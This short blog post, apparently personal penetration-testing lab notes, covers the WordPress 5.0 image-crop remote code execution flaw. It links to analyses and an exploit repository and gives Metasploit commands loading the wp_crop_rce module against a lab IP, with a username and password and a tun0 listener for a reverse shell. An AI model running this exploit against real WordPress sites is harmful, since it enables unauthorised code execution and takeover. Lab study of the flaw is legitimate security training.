---
layout: post
title: Wordpress 5 RCE
description: Wordpress 5 RCE
summary: Wordpress 5 RCE
tags: [rce,wordpress,foothold,web]
minute: 1
---
**This attack is very complicated and hard to understand for beginners**

* [WordPress 5.0.0 Remote Code Execution](https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips)
* [The detailed analysis of WordPress 5.0 RCE - by Knownsec 404 team](https://medium.com/@knownsec404team/the-detailed-analysis-of-wordpress-5-0-rce-a171ed719681)
* [Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog](https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942/)
* [CVE-2019-8943 exploit by v0lck3r](https://github.com/v0lck3r/CVE-2019-8943.git)
* Metasploit Commands

```bash
use exploit/multi/http/wp_crop_rce
set rhosts 10.10.188.55
set username kwheel
set password cutiepie1
set lhost tun0
```
